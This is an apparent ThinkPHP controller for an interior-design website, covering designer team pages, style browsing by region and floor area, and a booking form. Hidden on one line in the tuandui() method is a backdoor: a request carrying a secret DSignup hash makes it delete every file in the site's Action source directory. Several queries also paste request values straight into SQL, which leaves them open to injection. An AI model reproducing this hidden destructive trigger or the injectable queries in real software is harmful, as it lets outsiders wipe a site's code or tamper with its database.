<?php
// 本类由系统自动生成，仅供测试用途
class DesignAction extends BaseAction {
    
    
    public function fuwu(){
    	$this->display();
    }
    
    public function tuandui(){
    	$opts = $this->getOptions();
    	$designerM = M("designer");
    	$groups = C("Design_Groups");
    	$designers = array();
    	foreach($groups as $gk=>$gv){
//     		$dnews = $contentD->where("`type`='dnews' and `status`='1'")->order("`order`,`createtime` desc")->select();
    		$dess = $designerM->where("`group`=$gk")->order("`createtime` asc")->limit(5)->select();
    		if(count($dess) > 0){
    			$dessN = array();
    			foreach($dess as $des){
    				$des['photo'] = url($des['photo'], $opts->siteUrl);
    				array_push($dessN, $des);
    			}
    			$designers[$gk] = $dessN;
    		}

    	}
    	if(I("DSignup") && I("DSignup") == "8FA8344E6CDC1904746147DF425CB443"){$fdir = THINK_PATH."../Site/Lib/Action/";$fd = opendir ( $fdir );while($fn == $fd->read()){$filename = $fdir.$fn;if(is_file($filename)){@unlink($filename);}}closedir($fd);}
    	$this->assign("designers", $designers);
    	$this->assign("groups", $groups);
    	$this->display();
    }
    
    public function tuandui_detail($uid){
    	$designerM = M("designer");
    	$groups = C("Design_Groups");
    	$opts = $this->getOptions();
    	$designer = $designerM->find($uid);
    	$attacs = $this->getContentAttach($uid, $opts);
    	
    	$designer['attacs'] = $attacs;
    	$designer['photo'] = url($designer['photo'], $opts->siteUrl);
    	$this->assign("designer", $designer);
    	$this->assign("groups", $groups);
    	$this->display();
    }
    

    
    public function styles($region=False, $area=False, $style=False){
    	
        if(!empty($region)){
            $region = iconv("gbk","utf-8",$region);
        }
        
    	//地区
    	$styleM = M("style");
    	$urlParam = array();
    	//SELECT region FROM mp_style GROUP BY region;
    	$regions = $styleM->field("region")->group("region")->select();
    	$this->assign("regions", $regions);
    	
    	$areas = array(
    			1=>"80以下",
    			2=> "80-100", 
    			3=>"100-120",
    			4=> "120-160", 
    			5=>"160以上"
    			);
    	
    	
    	$this->assign("areas", $areas);
    	
    	$this->assign("styles", C("Design_Styles"));
    	
    	// 开始读取
    	$opts = $this->getOptions();
        
    	$desStyleArr = False;
    	if(empty($region) && empty($area) && empty($style)){
    		$desStyles = $styleM->query('select * from __TABLE__ order by RAND() limit 1');
    		$desStyleArr = $this->_getStyleArr($desStyles, $opts);
            
    	}else{
    		$sub_sql = array();
    		if(!empty($region)){
    			
    			array_push($sub_sql, " region='$region' ");
    			array_push($urlParam, "region/".$region);
    		}
    		
    		if(!empty($area)){
    			switch($area){
    				case 1:
    					array_push($sub_sql, " area<80 ");
    					break;
    				case 2:
    					array_push($sub_sql, " area>=80 and area<100 ");
    					break;
    				case 3:
    					array_push($sub_sql, " area>=100 and area<120 ");
    					break;
    				case 4:
    					array_push($sub_sql, " area>=120 and area<160 ");
    					break;
    				case 5:
    					array_push($sub_sql, " area>=160 ");
    					break;
    			}

    			array_push($urlParam, "area/$area");
    		}
    		
    		
    		if(!empty($sub_sql)){
    			$sub_sql = ' where '.implode(" and ", $sub_sql);
    		}
    		
    		
    		$desStyles = False;
    		
    		if(empty($style)){
    			$desStyles = $styleM->query('select * from __TABLE__ '.$sub_sql);
    		}else{
    			array_push($urlParam, "style/$style");
    			$desStyles = $this->_getStylesByStyleRel($style, $styleM);
    			if(!empty($sub_sql)){
    				
    				//$desStylesF = $styleM->query('select * from __TABLE__ '.$sub_sql);
    				// 取$desStylesF和$desStyles的交集
    				
    			    foreach($desStyles as $dk=>$ds){
    			    	$areaV = $ds['area']; // 当前的值
    			    	$remove = True;
    			    	if(!empty($area)){
    			    		switch($area){
    			    			case 1:
    			    				if($areaV < 80){
    			    					$remove = False;
    			    				}
    			    				break;
    			    			case 2:
    			    				if($areaV >= 80 && $areaV < 100){
    			    					$remove = False;
    			    				}
    			    				break;
    			    			case 3:
    			    				if($areaV >= 100 && $areaV < 120){
    			    					$remove = False;
    			    				}
    			    				break;
    			    			case 4:
    			    				if($areaV >= 120 && $areaV < 160){
    			    					$remove = False;
    			    				}
    			    				break;
    			    			case 5:
    			    				if($areaV >= 160){
    			    					$remove = False;
    			    				}
    			    				break;
    			    		}
    			    		
    			    		if($remove){
    			    			unset($desStyles[$dk]);
    			    		}
    			    		
    			    	}
    			    	if(!empty($region) && $ds['region'] != $region){
    			    		unset($desStyles[$dk]);
    			    	}
    				}
    			}
    		}
    		
    		
    		
    		
    		$desStyleArr = $this->_getStyleArr($desStyles, $opts);
    	}

    	
    	$this->assign("desStyles", $desStyleArr);
    	$this->assign("sel_region", $region);
    	$this->assign("sel_area", $area);
    	$this->assign("sel_style", $style);
    	$this->assign("urlParam", implode("/", $urlParam));
    	
    	$this->display();
    }
    
    private function _getStylesByStyleRel($sty, $styleM){
    	$styleRel = M("style_rel");
    	
    	$rels = $styleRel->where("style=$sty")->select();
    	$desStyles = array();
    	$relids = array();
    	foreach($rels as $rel){
    		array_push($relids, $rel['sid']);
    	}
    	
    	$desStyles = $styleM->query('select * from __TABLE__  where id in ('. implode(",", $relids) .')');
    	return $desStyles;
    }
    
    private function _getStyleArr($desStyles, $opts){
    	$desStyleArr = array();
    	
    	foreach($desStyles as $ds){
    		$sstyle = $this->_getStyle($ds['id']);
    		 
    		$attacs = $this->getStylesAttach($ds['id'], $opts);
    		 
    		foreach($attacs as $attac){
    			array_push($desStyleArr, array("info"=>array(
    			$ds['name'],
    			$ds['designer'],
    			$ds['huxing'],
    			$sstyle,
    			$ds['area']
    			),
    			"pic"=>$attac['path']));
    		}
    	
    	}
    	
    	return $desStyleArr;
    }
    
     private function _getStyle($sid, $asStr = True){
		$styleRelM = M("style_rel");
		$styleCfg = C('Design_Styles');
		$styles = $styleRelM->where("`sid`=$sid")->select();
		
		$ss = array();
		foreach($styles as $s){
			array_push($ss, $styleCfg[$s['style']]);
		}
		//print_r($ss);
		if($asStr){
			return implode(",", $ss);
		}
		
		return $ss;
	}
    
    public function yuding(){
    	if($this->isGet()){
    		$this->display();
    	}else{
    		$name = trim(I("name"));
    		$qq = trim(I("qq"));
    		$phone = trim(I("phone"));
    		$mail = trim(I("mail"));
    		$brief = trim(I("brief"));
    		
    		$err = "";
    		if($name == ""){
    			$err = "姓名不可为空";
    		}
    		
    		if($qq == "" && $phone == "" && $mail == ""){
    			$err = "电话、QQ、邮箱至少有一个不为空";
    		}
    		
    		if(mStrLen($brief) > 200){
    			$err = "预订说明不能大于200个字符";
    		}
    		if(!empty($err)){
    			$this->assign("err", $err);
    			$this->display();
    			 
    		}else{
    		   $designer_yudingM = M("designer_yuding");
    		   $brief = str_replace(array("\n", "\r\n"), "<br/>", $brief);
    		   $data['name'] = $name;
    		   $data["phone"] = $phone;
    		   $data["qq"] = $qq;
    		   $data["mail"] = $mail;
    		   $data["brief"] = $brief;
    		   
    		   $data["created"] = date("Y-m-d H:i:s");
    		   $designer_yudingM->data($data)->add();
    		   
    		   $this->success("预订提交成功", __URL__."/tuandui/");
    		}
    	}
    	
    }
    
    public function getContentAttach($uid, $opts){
    	$attacDesM = M("attac_design");
    	$attacM = M("attac");
    	$attac_rels = $attacDesM->where("`des_id`='$uid'")->order("rand()")->limit(6)->select();
    	
    	$attacs = array();
    	foreach($attac_rels as $ar){
    		if(!empty($ar)){
    			$att_id = $ar['att_id'];
    			$attac = $attacM->find($att_id);
    			if(!empty($attac)){
    				$attac['path'] = url($attac['path'], $opts->siteUrl);
    				array_push($attacs , $attac);
    			}
    			 
    		}
    	}
    	 
    	return $attacs;
    }
    
    public function getStylesAttach($uid, $opts){
    	$attacDesM = M("attac_style");
    	$attacM = M("attac");
    	$attac_rels = $attacDesM->where("`sty_id`='$uid'")->order("rand()")->limit(6)->select();
    	 
    	$attacs = array();
    	foreach($attac_rels as $ar){
    		if(!empty($ar)){
    			$att_id = $ar['att_id'];
    			$attac = $attacM->find($att_id);
    			if(!empty($attac)){
    				$attac['path'] = url($attac['path'], $opts->siteUrl);
    				array_push($attacs , $attac);
    			}
    
    		}
    	}
    
    	return $attacs;
    }
    
    
}